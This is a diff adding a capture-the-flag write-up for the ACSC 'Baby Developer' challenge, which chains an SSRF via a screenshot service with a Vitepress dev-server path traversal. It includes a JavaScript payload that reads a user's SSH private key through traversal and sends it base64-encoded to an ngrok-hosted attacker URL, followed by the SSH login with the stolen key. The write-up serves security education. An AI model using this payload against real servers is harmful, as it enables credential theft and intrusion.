@@ -1,0 +1,73 @@
+<hr />
+
+<p>description: &gt;-
+  Directory traversal in insecure Vitepress development server leads to</p>
+
+<h2>  information disclosure through SSRF</h2>
+
+<h1>Baby Developer</h1>
+
+<h2>Description</h2>
+
+<p>I made a mobile (apple watch miniminimini series 1337) viewer on my personal server.</p>
+
+<ul>
+<li><code>http://baby-developer.chal.acsc.asia:8888/</code></li>
+<li><code>ssh baby-developer.chal.acsc.asia -p2222</code></li>
+</ul>
+
+<p>{% file src="../../.gitbook/assets/baby-developer.tar.gz_f5f00919ccc94f797a24d1a823a61773.gz" caption="Challenge Files" %}</p>
+
+<h2>Solution</h2>
+
+<ul>
+<li>There is a <code>genflag</code> server which you are supposed to SSRF</li>
+<li>However, the remote address and user agent are checked so you can't do it directly from <code>mobile-viewer</code></li>
+<li>The pages are rendered as screenshots</li>
+</ul>
+
+<p><code>python
+@app.route('/flag')
+def hello_world():
+    if request.remote_addr == dev and 'iPhone' not in request.headers.get('User-Agent'):
+        fp = open('/flag', 'r')
+        flag = fp.read()
+        return flag
+    else:
+        return "Nope.."
+</code></p>
+
+<p>From <code>mobile-viewer</code>, we need to request <code>http://genflag/flag</code> from <code>website</code>. This can be done from <code>/home/stypr/readflag</code> on <code>website</code>.</p>
+
+<p>```text</p>
+
+<h1>Challenge: get flag!</h1>
+
+<p>RUN touch /home/stypr/.hushlogin &amp;&amp; \
+    echo '#include <stdio.h>\r\n#include <stdlib.h>\r\nint main(){FILE *fp;char flag[1035];fp = popen("/usr/bin/curl -s http://genflag/flag", "r");if (fp == NULL) {printf("Error found. Please contact administrator.");exit(1);}while (fgets(flag, sizeof(flag), fp) != NULL) {printf("%s", flag);}pclose(fp);return 0;}' &gt; /home/stypr/readflag.c &amp;&amp; \
+    gcc -o /home/stypr/readflag /home/stypr/readflag.c &amp;&amp; \
+    chmod +x /home/stypr/readflag &amp;&amp; rm -rf /home/stypr/readflag.c
+```</p>
+
+<p>Refer to the <a href="https://github.com/stypr/harold.kim/blob/main/package.json">website source</a>. The <code>website</code> server runs <code>yarn dev</code>, which runs <code>vitepress dev src</code>.</p>
+
+<p>Vitepress is run on dev mode. I found that this enables CORS, allowing us to perform a CSRF to exfiltrate data. Furthermore, I found that there was a path traversal vulnerability, allowing us to get the SSH key: <code>http://website/../../../../../home/stypr/.ssh/id_rsa</code></p>
+
+<p>From <code>mobile-viewer</code>, we can make a request to our attacker site, which contains:</p>
+
+<p>```markup</p>
+
+<script>
+    fetch("http://website/../../../../../home/stypr/.ssh/id_rsa")
+    .then(resp => resp.text())
+    .then(data => fetch('http://0db7-115-66-195-39.ngrok.io/?' + btoa(data)))
+</script>
+
+<p>```</p>
+
+<p>Get the private key and SSH into the server to get the flag:</p>
+
+<p><code>text
+$ ssh stypr@baby-developer.chal.acsc.asia -p2222 -i id_rsa 
+ACSC{weird_bugs_pwned_my_system_too_late_to_get_my_CVE}
+</code></p>
